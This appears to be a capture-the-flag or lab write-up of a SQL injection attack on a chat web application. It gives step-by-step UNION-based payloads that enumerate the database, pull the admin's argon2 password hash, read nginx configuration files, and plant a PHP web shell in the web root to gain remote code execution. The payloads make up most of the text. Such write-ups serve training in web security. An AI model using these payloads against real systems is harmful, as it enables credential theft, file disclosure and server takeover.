>1. What is the password hash for the user 'admin'?
>After looking for an attack vector, we could inject SQL code in the invitation code via BurpSuite (intercepting the traffic). We use Burp because the input had a local sanitization in the client side.
>![[Pasted image 20260220210221.png]]
>Once the accout was created, we logged in and it displays a chat. We can use SQLi in the search input.
>After trying different attempts like:
>```sql
>LOL' UNION SELECT 1,2 -- -
>LOL' UNION SELECT 1,2,3 -- -
>LOL' UNION SELECT null, null, null -- -
>LOL' UNION SELECT null, null, null, null -- -
>```
>The attempt was successfully with:
>```sql
>LOL')  UNION SELECT null, null, null, null -- -
>```
>Because the response intercepted by burp returned 200 OK and the page displayed a empty box (because of NULL value)
>![[Pasted image 20260221144020.png]]
>So, we can use different variants to enumerate the database (e.g.username)
>```sql
>LOL')  UNION SELECT null, null, user(), null -- -
>```
>![[Pasted image 20260221144619.png]]
>We gather the following data_
>- **USER**: chattr_dbUser@localhost
>- **DATABASE**: chattr
>```sql
>LOL')  UNION SELECT null, null, SCHEMA_NAME, null FROM INFORMATION_SCHEMA.SCHEMATA -- -
>LOL')  UNION SELECT null, null, TABLE_NAME, null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='chattr'-- -
>```
>![[Pasted image 20260221150248.png]]
>lets dive in users:
>```sql
>LOL')  UNION SELECT null, null, COLUMN_NAME, null FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users'-- -
>```
>![[Pasted image 20260221150748.png]]
>```sql
>LOL')  UNION SELECT null, null, Password, null FROM Users WHERE Username='Admin'-- -
>```
>$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
>
>![[Pasted image 20260221151152.png]]
>2. What is the root path of the web application?
>By reading the headers of the responses or looking for a path that doesn't exist, the server throws the service/version of the web app:
>![[Pasted image 20260224124604.png]]
>We can search the most common config files path on Internet.
>- /etc/nginx/nginx.conf
>- We got the **nginx** config file and looked for important content
>```sql
>LOL')  UNION SELECT null, null, LOAD_FILE('/etc/nginx/nginx.conf'), NULL-- -
>```
>![[Pasted image 20260224130414.png]]
>We realized that the most important dir was:
>- /etc/nginx/sites-enabled/default'
>```sql
>So, we got the file
>LOL') UNION SELECT null, null, LOAD_FILE('/etc/nginx/sites-enabled/default'), NULL-- -
>```
>![[Pasted image 20260224125937.png]]
>The root path of the web server is **/var/www/chattr-prod**
>
>1. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.
>After having the root path of the server, we load a file with:
>```sql
>LOL') UNION SELECT '','', '<?php system($_REQUEST[0]); ?>', '' INTO OUTFILE '/var/www/chattr-prod/shell2.php'-- -
>```
>We performed the command `ls`:
>![[Pasted image 20260224131736.png]]
>## ***AND WE ARE IN***
>Now, we just have to dive into the files to find the flag
>![[Pasted image 20260224134056.png]]
>We just performed a `cat` command and **HEADSHOT**


